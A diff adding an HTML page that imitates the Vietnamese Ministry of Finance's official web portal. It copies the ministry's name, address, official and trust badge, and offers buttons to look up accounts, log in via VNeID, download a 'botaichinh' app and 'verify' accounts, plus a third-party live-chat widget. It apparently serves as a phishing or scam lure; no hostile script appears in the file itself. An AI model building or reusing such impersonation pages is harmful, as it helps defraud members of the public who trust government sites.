@@ -1,0 +1,972 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cổng Thông tin điện tử Bộ Tài Chính</title>
+    <meta
+      name="description"
+      content="Cổng thông tin chính thức của Bộ Tài Chính. Cung cấp thông tin tài chính, chính sách thuế, và các dịch vụ công trực tuyến."
+    />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Bộ Tài Chính" />
+    <meta
+      property="og:description"
+      content="Cổng thông tin tài chính chính thức Việt Nam"
+    />
+    <meta property="og:url" content="" />
+    <meta property="og:site_name" content="Cổng thông tin Bộ Tài Chính" />
+    <meta property="og:image" content="./image/2024-11-08_08.46.13-removebg-preview.png" />
+    <link rel="icon" href="./image/2024-11-08_08.46.13-removebg-preview.png">
+
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css"
+      integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+      integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js"
+      integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js"
+      integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+      crossorigin="anonymous"
+    ></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+      integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <link rel="icon" href="./logo-fav.png" />
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+      }
+      .header {
+        height: 60px;
+        margin-top: 20px;
+        margin-bottom: 40px;
+      }
+      .header img.logo {
+        height: 80px;
+        width: auto;
+        object-fit: contain;
+        max-width: 100%;
+        border-style: solid;
+        border-width: 0px 0px 0px 0px;
+        border-color: #fff0b5;
+        border-radius: 50px 50px 50px 50px;
+        box-shadow: 0px 0px 10px 0px #fff0b5;
+      }
+      .header img.logo-mobile {
+        display: none;
+        height: 80px;
+        width: auto;
+        object-fit: contain;
+        max-width: 100%;
+      }
+      .section-col img:hover {
+        transform: scale(1.1);
+        transition: transform 0.5s ease;
+      }
+      @media screen and (max-width: 1024px) {
+        .header img.logo {
+          display: none;
+        }
+        .header img.logo-mobile {
+          display: block;
+        }
+        .header {
+          display: flex;
+          justify-content: center;
+          flex-direction: column;
+          margin-bottom: 20px;
+        }
+        .header img {
+          width: 100%;
+          display: block;
+        }
+      }
+      @media screen and (max-width: 768px) {
+        .section-col img:hover {
+          transform: scale(1.05);
+          transition: transform 0.5s ease;
+        }
+        .section-col img {
+          height: 250px !important;
+        }
+      }
+
+      .site-footer-new {
+        display: inline-block;
+        width: 100%;
+        background-color: #000000;
+        padding: 20px;
+        color: #ffffff;
+        font-size: 13px;
+        font-weight: 400;
+      }
+
+      .site-footer-new ul {
+        padding: 0;
+        list-style: none;
+      }
+
+      .site-footer-new .footer-logo {
+        padding-bottom: 10px;
+      }
+
+      .site-footer-new .copy-right {
+        font-weight: 500;
+        font-size: 12px;
+        margin-bottom: 5px;
+        white-space: nowrap;
+      }
+
+      .site-footer-new a {
+        color: #ffffff;
+      }
+
+      .site-footer-new a:hover {
+        color: #01904a;
+      }
+
+      .footer-logo .logo-ghtk {
+        max-width: 150px;
+      }
+
+      .footer-logo .logo-ghtk {
+        max-width: 150px;
+      }
+
+      .footer-links .menu {
+        display: flex;
+        flex-wrap: wrap;
+        margin-left: -5px;
+        margin-bottom: 1rem;
+      }
+
+      .footer-links .menu .menu-item {
+        margin: 0 5px;
+        font-size: 13px;
+      }
+
+      .footer-links .menu .menu-item:first-child {
+        padding-left: 0;
+      }
+
+      .social-links .list-social-items {
+        display: flex;
+      }
+      .social-links .list-social-items .social-item {
+        margin: 5px;
+      }
+
+      .social-links .social-item i {
+        font-size: 30px;
+      }
+
+      .social-links .social-item .img-fb-group {
+        max-width: 3rem;
+      }
+      .social-links .social-item .img-cert {
+        max-width: 8rem;
+      }
+      .block.block-signup {
+        border-bottom: 1px solid #01904a;
+      }
+
+      .block.block-signup h3,
+      .block.block-signin h3 {
+        color: #333;
+        line-height: 100%;
+        font-size: 13px;
+        margin: 0 0 10px;
+        padding: 0;
+      }
+
+      .block.block-signup .btn,
+      .block.block-signin .btn {
+        font-size: 15px;
+        min-width: 70%;
+      }
+
+      .block.block-signin ul {
+        list-style: none;
+        margin: 10px 0 0 0;
+        padding: 0;
+        text-align: left;
+      }
+
+      .block.block-signin ul li {
+        background: url(images/menu-icon.png) no-repeat 100% 20px;
+        border-bottom: 1px solid #cfcfcf;
+        padding: 10px 0;
+      }
+
+      .block.block-signin ul li:last-child {
+        border-bottom: 0 none;
+        padding-bottom: 0;
+      }
+
+      .block.block-signin li a {
+        color: #111;
+        font-size: 16px;
+      }
+
+      .block.block-signin li a:focus,
+      .block.block-signin li a:hover {
+        color: #01904a;
+        text-decoration: none;
+      }
+
+      .block.block-signin li a span {
+        color: #999;
+        font-size: 11px;
+        display: block;
+      }
+
+      .block.block-signin .btn {
+        font-size: 15px;
+        font-weight: 300;
+      }
+
+      .block.block-signin .btn-default {
+        color: #01904a;
+      }
+
+      .block.block-signin .btn-default:focus,
+      .block.block-signin .btn-default:hover {
+        color: #333;
+      }
+      .btn-ghtk span {
+        float: left;
+        height: 20%;
+        font-size: 15px;
+        font-weight: 600;
+      }
+
+      .btn-ghtk > span {
+        margin-left: 20px;
+        display: block;
+        height: 20%;
+      }
+      .btn span {
+        margin-left: 20px;
+        display: block;
+        height: 20%;
+      }
+      .btn-ghtk > img {
+        width: 24px;
+      }
+      .menu-ghtk a {
+        padding: 3.5px 0 3.5px 0;
+        background: #f2f2f2;
+        padding-left: 10px;
+        padding-right: 10px;
+        background-image: -webkit-gradient(
+          linear,
+          left top,
+          left bottom,
+          from(#f5f5f5),
+          to(#f1f1f1)
+        );
+        height: 20%;
+        min-height: 60px;
+        background-image: -webkit-linear-gradient(top, #f5f5f5, #f1f1f1);
+        -webkit-border-radius: 2px;
+        -webkit-user-select: none;
+        background-color: #f2f2f2;
+        color: #5f6368;
+        cursor: pointer;
+        font-family: arial, sans-serif;
+        font-size: 15px;
+        position: relative;
+      }
+      .btn-ghtk:before {
+        font-family: "FontAwesome";
+        content: "\f105";
+        position: absolute;
+        float: right;
+        font-size: 25px;
+        color: #867e7e;
+        right: 10px;
+      }
+      @media screen and (max-width: 1024px) {
+        .menu-ghtk {
+          margin-top: 20px;
+        }
+      }
+    </style>
+    <style>
+      @media screen and (max-width: 1024px) {
+        .header {
+          height: 100px;
+        }
+      }
+      body {
+        background-color: #f7f6f6;
+        width: 100dvw;
+        height: 100dvh;
+        overflow-y: scroll;
+      }
+      .footer {
+        float: left;
+        width: 100%;
+        margin-top: 20px;
+        background: #2673b4;
+        padding: 20px 0px;
+        height: auto;
+        color: #fff;
+      }
+      .ft-left {
+        float: left;
+        width: 310px;
+        position: relative;
+        border-right: 1px solid #3b92db;
+        width: 20%;
+      }
+      .ft-center {
+        padding: 5px 30px 0px;
+      }
+      @media screen and (max-width: 991px) {
+        .ft-center {
+          padding: 0 15px;
+        }
+        .center-mobile {
+          display: flex;
+          justify-content: center;
+          flex-direction: column;
+          margin-bottom: 20px;
+          font-size: 18px;
+          a {
+            display: block;
+          }
+        }
+      }
+    </style>
+    <script
+      async=""
+      type="text/javascript"
+      src="https://cdn.livechatinc.com/tracking.js"
+    ></script>
+    <style type="text/css">
+      .vue-slider-dot {
+        position: absolute;
+        -webkit-transition: all 0s;
+        transition: all 0s;
+        z-index: 5;
+      }
+      .vue-slider-dot:focus {
+        outline: none;
+      }
+      .vue-slider-dot-tooltip {
+        position: absolute;
+        visibility: hidden;
+      }
+      .vue-slider-dot-hover:hover .vue-slider-dot-tooltip,
+      .vue-slider-dot-tooltip-show {
+        visibility: visible;
+      }
+      .vue-slider-dot-tooltip-top {
+        top: -10px;
+        left: 50%;
+        -webkit-transform: translate(-50%, -100%);
+        transform: translate(-50%, -100%);
+      }
+      .vue-slider-dot-tooltip-bottom {
+        bottom: -10px;
+        left: 50%;
+        -webkit-transform: translate(-50%, 100%);
+        transform: translate(-50%, 100%);
+      }
+      .vue-slider-dot-tooltip-left {
+        left: -10px;
+        top: 50%;
+        -webkit-transform: translate(-100%, -50%);
+        transform: translate(-100%, -50%);
+      }
+      .vue-slider-dot-tooltip-right {
+        right: -10px;
+        top: 50%;
+        -webkit-transform: translate(100%, -50%);
+        transform: translate(100%, -50%);
+      }
+    </style>
+    <style type="text/css">
+      .vue-slider-marks {
+        position: relative;
+        width: 100%;
+        height: 100%;
+      }
+      .vue-slider-mark {
+        position: absolute;
+        z-index: 1;
+      }
+      .vue-slider-ltr .vue-slider-mark,
+      .vue-slider-rtl .vue-slider-mark {
+        width: 0;
+        height: 100%;
+        top: 50%;
+      }
+      .vue-slider-ltr .vue-slider-mark-step,
+      .vue-slider-rtl .vue-slider-mark-step {
+        top: 0;
+      }
+      .vue-slider-ltr .vue-slider-mark-label,
+      .vue-slider-rtl .vue-slider-mark-label {
+        top: 100%;
+        margin-top: 10px;
+      }
+      .vue-slider-ltr .vue-slider-mark {
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+      }
+      .vue-slider-ltr .vue-slider-mark-step {
+        left: 0;
+      }
+      .vue-slider-ltr .vue-slider-mark-label {
+        left: 50%;
+        -webkit-transform: translateX(-50%);
+        transform: translateX(-50%);
+      }
+      .vue-slider-rtl .vue-slider-mark {
+        -webkit-transform: translate(50%, -50%);
+        transform: translate(50%, -50%);
+      }
+      .vue-slider-rtl .vue-slider-mark-step {
+        right: 0;
+      }
+      .vue-slider-rtl .vue-slider-mark-label {
+        right: 50%;
+        -webkit-transform: translateX(50%);
+        transform: translateX(50%);
+      }
+      .vue-slider-btt .vue-slider-mark,
+      .vue-slider-ttb .vue-slider-mark {
+        width: 100%;
+        height: 0;
+        left: 50%;
+      }
+      .vue-slider-btt .vue-slider-mark-step,
+      .vue-slider-ttb .vue-slider-mark-step {
+        left: 0;
+      }
+      .vue-slider-btt .vue-slider-mark-label,
+      .vue-slider-ttb .vue-slider-mark-label {
+        left: 100%;
+        margin-left: 10px;
+      }
+      .vue-slider-btt .vue-slider-mark {
+        -webkit-transform: translate(-50%, 50%);
+        transform: translate(-50%, 50%);
+      }
+      .vue-slider-btt .vue-slider-mark-step {
+        top: 0;
+      }
+      .vue-slider-btt .vue-slider-mark-label {
+        top: 50%;
+        -webkit-transform: translateY(-50%);
+        transform: translateY(-50%);
+      }
+      .vue-slider-ttb .vue-slider-mark {
+        -webkit-transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%);
+      }
+      .vue-slider-ttb .vue-slider-mark-step {
+        bottom: 0;
+      }
+      .vue-slider-ttb .vue-slider-mark-label {
+        bottom: 50%;
+        -webkit-transform: translateY(50%);
+        transform: translateY(50%);
+      }
+      .vue-slider-mark-label,
+      .vue-slider-mark-step {
+        position: absolute;
+      }
+    </style>
+    <style type="text/css">
+      .vue-slider {
+        position: relative;
+        -webkit-box-sizing: content-box;
+        box-sizing: content-box;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        display: block;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+      }
+      .vue-slider-rail {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        -webkit-transition-property: width, height, left, right, top, bottom;
+        transition-property: width, height, left, right, top, bottom;
+      }
+      .vue-slider-process {
+        position: absolute;
+        z-index: 1;
+      }
+    </style>
+    <style>
+      @import url("chrome-extension://adlpodnneegcnbophopdmhedicjbcgco/content/styles.css");
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header d-flex align-items-center">
+        <img
+          src="./image/2024-11-08_08.46.13-removebg-preview.png"
+          alt=""
+          class="logo"
+          height="100px"
+        />
+        <img
+          class="logo-mobile"
+          height="100px"
+          src="./image/logo-text.png"
+          alt=""
+        />
+        <img
+          width="705 "
+          height="47 "
+          src="./image/Screenshot 2024-11-08 at 08.57.19.png"
+          class="attachment-full size-full"
+          alt=" "
+        />
+      </div>
+      <div class="main-container">
+        <section class="mt-4">
+          <div class="row">
+            <div class="col-12 col-lg-8">
+              <img
+                style="width: 100%; height: auto"
+                src="./image/Ảnh họp.jpg"
+                alt=""
+              />
+            </div>
+
+            <div class="col-12 col-lg-4">
+              <div
+                class="block block-signup h-100"
+                style="
+                  border-bottom: none;
+                  box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.3);
+                "
+              >
+                <div class="content text-center menu-ghtk h-100">
+                  <a
+                    id="menu-item-17"
+                    target="_blank"
+                    class="btn btn-ghtk h-20 d-flex align-items-center justify-content- ghtk-search"
+                    style="min-width: 100%; border-bottom: 2px solid #ccc"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      height="30px"
+                      viewBox="0 -960 960 960"
+                      width="30px"
+                      fill="#000000"
+                    >
+                      <path
+                        d="M784-120 532-372q-30 24-69 38t-83 14q-109 0-184.5-75.5T120-580q0-109 75.5-184.5T380-840q109 0 184.5 75.5T640-580q0 44-14 83t-38 69l252 252-56 56ZM380-400q75 0 127.5-52.5T560-580q0-75-52.5-127.5T380-760q-75 0-127.5 52.5T200-580q0 75 52.5 127.5T380-400Z"
+                      ></path>
+                    </svg>
+                    <span> Tra cứu tài khoản </span>
+                  </a>
+                  <a
+                    class="btn btn-ghtk h-20 d-flex align-items-center justify-content- ghtk-register"
+                    style="min-width: 100%; border-bottom: 2px solid #ccc"
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      height="30px"
+                      viewBox="0 -960 960 960"
+                      width="30px"
+                      fill="#000000"
+                    >
+                      <path
+                        d="M160-400v-80h280v80H160Zm0-160v-80h440v80H160Zm0-160v-80h440v80H160Zm360 560v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q8 9 12.5 20t4.5 22q0 11-4 22.5T863-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z"
+                      ></path>
+                    </svg>
+                    <span> Đăng ký VNelD l đăng nhập </span>
+                  </a>
+                  <a
+                    class="btn btn-ghtk h-20 d-flex align-items-center justify-content- ghtk-cod"
+                    style="min-width: 100%; border-bottom: 2px solid #ccc"
+                  >
+                    <img
+                      src="./image/2024-11-08_08.46.13-removebg-preview.png"
+                    />
+                    <span> Bộ Tài chính </span>
+                  </a>
+                  <a
+                    class="btn btn-ghtk h-20 d-flex align-items-center justify-content- ghtk-app"
+                    style="
+                      min-width: 100%;
+                      background: #f2f2f2;
+                      padding-left: 10px;
+                      padding-right: 10px;
+                      border-bottom: 2px solid #ccc;
+                    "
+                  >
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      height="30px"
+                      viewBox="0 -960 960 960"
+                      width="30px"
+                      fill="#000000"
+                    >
+                      <path
+                        d="M320-280h320q17 0 28.5-11.5T680-320q0-17-11.5-28.5T640-360H320q-17 0-28.5 11.5T280-320q0 17 11.5 28.5T320-280Zm120-274-36-35q-11-11-27.5-11T348-588q-11 11-11 28t11 28l104 104q12 12 28 12t28-12l104-104q11-11 11.5-27.5T612-588q-11-11-27.5-11.5T556-589l-36 35v-126q0-17-11.5-28.5T480-720q-17 0-28.5 11.5T440-680v126Zm40 474q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Zm0-80q134 0 227-93t93-227q0-134-93-227t-227-93q-134 0-227 93t-93 227q0 134 93 227t227 93Zm0-320Z"
+                      ></path>
+                    </svg>
+                    <span> Tải app botaichinh </span>
+                  </a>
+                  <a
+                    class="btn btn-ghtk h-20 d-flex align-items-center justify-content- ghtk-app"
+                    style="
+                      min-width: 100%;
+                      background: #f2f2f2;
+                      padding-left: 10px;
+                      padding-right: 10px;
+                    "
+                  >
+                    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+                    <svg
+                      width="20px"
+                      height="20px"
+                      viewBox="0 0 16 16"
+                      fill="none"
+                      xmlns="http://www.w3.org/2000/svg"
+                    >
+                      <path
+                        d="M8 7C9.65685 7 11 5.65685 11 4C11 2.34315 9.65685 1 8 1C6.34315 1 5 2.34315 5 4C5 5.65685 6.34315 7 8 7Z"
+                        fill="#000000"
+                      />
+                      <path
+                        d="M14 12C14 10.3431 12.6569 9 11 9H5C3.34315 9 2 10.3431 2 12V15H14V12Z"
+                        fill="#000000"
+                      />
+                    </svg>
+                    <span> Xác minh tài khoản </span>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="mt-4">
+          <img
+            style="border-radius: 5px; width: 100%; height: auto"
+            width="1121 "
+            height="651 "
+            src="./image/screen2.png"
+            class="attachment-full size-full"
+            alt=" "
+          />
+        </section>
+        <section class="mt-4">
+          <img
+            style="border-radius: 5px; width: 100%; height: auto"
+            width="1121 "
+            height="651 "
+            src="./image/screen3.png"
+            class="attachment-full size-full"
+            alt=" "
+          />
+        </section>
+        <section class="mt-4">
+          <img
+            style="border-radius: 5px; width: 100%; height: auto"
+            width="1112 "
+            height="635 "
+            src="./image/screen4.png"
+            class="attachment-full size-full"
+            alt=" "
+          />
+        </section>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="row px-5" style="display: flex; flex-wrap: wrap">
+        <div class="center-mobile col-lg-3 col-12">
+          <a class="logo-ft" href="">
+            <img
+              alt="123"
+              style="width: 100%; max-width: 200px"
+              src="./image/logo-text.png"
+              class="mb-2"
+            /> </a
+          ><a
+            href="https://tinnhiemmang.vn/danh-ba-tin-nhiem/mofgovvn-1688010046"
+            target="_blank"
+            title="Chung nhan Tin Nhiem Mang"
+          >
+            <img
+              alt="Chung nhan Tin Nhiem Mang"
+              height="auto"
+              src="https://tinnhiemmang.vn/handle_cert?id=mof.gov.vn"
+              width="150px"
+            />
+          </a>
+
+          <div class="img d-none">
+            <img alt="123" src="/theme-service/btc/img/bg-footer.png" />
+          </div>
+        </div>
+        <div class="ft-center center-mobile col-lg-6 col-12">
+          <div class="ft-center-content">
+            <p class="fsize-24">
+              <b>CỔNG THÔNG TIN ĐIỆN TỬ BỘ TÀI CHÍNH</b>
+            </p>
+            <p class="fsize-18">
+              Cơ quan chủ quản:<b class="ml-1">Bộ Tài chính</b>
+            </p>
+            <p class="fsize-18">
+              Người chịu trách nhiệm:<b class="ml-1"
+                >Thứ trưởng Nguyễn Đức Chi</b
+              >
+            </p>
+          </div>
+        </div>
+        <div class="center-mobile col-lg-3 col-12">
+          <div class="traffic">
+            <p>
+              <b>Khách online:</b>
+              <span id="onlCus">688</span>
+            </p>
+            <div class="d-flex">
+              <b>Lượt truy cập:</b>
+              <div></div>
+              <div><span class="accessNumber ml-1">122,221,397</span></div>
+              <div></div>
+            </div>
+          </div>
+        </div>
+        <div class="mt-2 text-center ft-contact ft-center w-100 col-12">
+          <div class="ft-ct-bot">
+            <p>
+              <b>Địa chỉ:</b>
+              Số 28 Trần Hưng Đạo - Quận Hoàn Kiếm - Hà Nội.
+
+              <b>Điện thoại Cổng thông tin điện tử:</b>
+              (84-24)2220.2828-2888.
+
+              <b>Fax:</b>
+              (84-24)2220.8091.
+
+              <b>Email:</b>
+              support@mof.gov.vn.
+            </p>
+          </div>
+          <div class="ft-cate d-flex justify-content-center">
+            <ul class="ul-ft">
+              <li>
+                <a>Sơ đồ site</a>
+              </li>
+              <li>
+                <a>Thông tin liên hệ</a>
+              </li>
+              <li>
+                <a>Hướng dẫn sử dụng</a>
+              </li>
+              <li>
+                <a>Đường dây nóng</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script>
+      window.__lc = window.__lc || {};
+      window.__lc.license = 18595932;
+      window.__lc.integration_name = "manual_channels";
+      window.__lc.product_name = "livechat";
+      (function (n, t, c) {
+        function i(n) {
+          return e._h ? e._h.apply(null, n) : e._q.push(n);
+        }
+        var e = {
+          _q: [],
+          _h: null,
+          _v: "2.0",
+          on: function () {
+            i(["on", c.call(arguments)]);
+          },
+          once: function () {
+            i(["once", c.call(arguments)]);
+          },
+          off: function () {
+            i(["off", c.call(arguments)]);
+          },
+          get: function () {
+            if (!e._h)
+              throw new Error(
+                "[LiveChatWidget] You can't use getters before load."
+              );
+            return i(["get", c.call(arguments)]);
+          },
+          call: function () {
+            i(["call", c.call(arguments)]);
+          },
+          init: function () {
+            var n = t.createElement("script");
+            (n.async = !0),
+              (n.type = "text/javascript"),
+              (n.src = "https://cdn.livechatinc.com/tracking.js"),
+              t.head.appendChild(n);
+          },
+        };
+        !n.__lc.asyncInit && e.init(),
+          (n.LiveChatWidget = n.LiveChatWidget || e);
+      })(window, document, [].slice);
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18595932/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
+
+    <div
+      id="chat-widget-container"
+      style="
+        opacity: 1;
+        visibility: visible;
+        z-index: 2147483639;
+        position: fixed;
+        bottom: 0px;
+        width: 84px;
+        height: 84px;
+        max-width: 100%;
+        max-height: calc(100% + 0px);
+        min-height: 0px;
+        min-width: 0px;
+        background-color: transparent;
+        border: 0px;
+        overflow: hidden;
+        right: 0px;
+        transition: none !important;
+      "
+    >
+      <iframe
+        allow="clipboard-read; clipboard-write; autoplay; microphone *; camera *; display-capture *; picture-in-picture *; fullscreen *;"
+        src="https://secure.livechatinc.com/customer/action/open_chat?license_id=18595932&amp;group=0&amp;embedded=1&amp;widget_version=3&amp;unique_groups=0&amp;use_parent_storage=1"
+        id="chat-widget"
+        name="chat-widget"
+        title="LiveChat chat widget"
+        scrolling="no"
+        style="
+          width: 100%;
+          height: 100%;
+          min-height: 0px;
+          min-width: 0px;
+          margin: 0px;
+          padding: 0px;
+          background-image: none;
+          background-position: 0% 0%;
+          background-size: initial;
+          background-attachment: scroll;
+          background-origin: initial;
+          background-clip: initial;
+          background-color: rgba(0, 0, 0, 0);
+          border-width: 0px;
+          float: none;
+          color-scheme: normal;
+          position: absolute;
+          inset: 0px;
+          transition: none !important;
+          display: none;
+          visibility: hidden;
+        "
+      ></iframe
+      ><iframe
+        id="chat-widget-minimized"
+        name="chat-widget-minimized"
+        title="LiveChat chat widget"
+        scrolling="no"
+        style="
+          width: 100%;
+          height: 100%;
+          min-height: 0px;
+          min-width: 0px;
+          margin: 0px;
+          padding: 0px;
+          background-image: none;
+          background-position: 0% 0%;
+          background-size: initial;
+          background-attachment: scroll;
+          background-origin: initial;
+          background-clip: initial;
+          background-color: rgba(0, 0, 0, 0);
+          border-width: 0px;
+          float: none;
+          color-scheme: normal;
+          display: block;
+        "
+      ></iframe>
+      <div
+        aria-live="polite"
+        id="lc-aria-announcer-polite"
+        tabindex="-1"
+        style="
+          height: 1px;
+          width: 1px;
+          margin: -1px;
+          overflow: hidden;
+          white-space: nowrap;
+          border: 0px;
+          padding: 0px;
+          position: absolute;
+        "
+      ></div>
+      <div
+        aria-live="assertive"
+        id="lc-aria-announcer-assertive"
+        tabindex="-1"
+        style="
+          height: 1px;
+          width: 1px;
+          margin: -1px;
+          overflow: hidden;
+          white-space: nowrap;
+          border: 0px;
+          padding: 0px;
+          position: absolute;
+        "
+      ></div>
+    </div>
+  </body>
+  <div class="troywell-avia"></div>
+  <div class="troywell-caa"></div>
+</html>
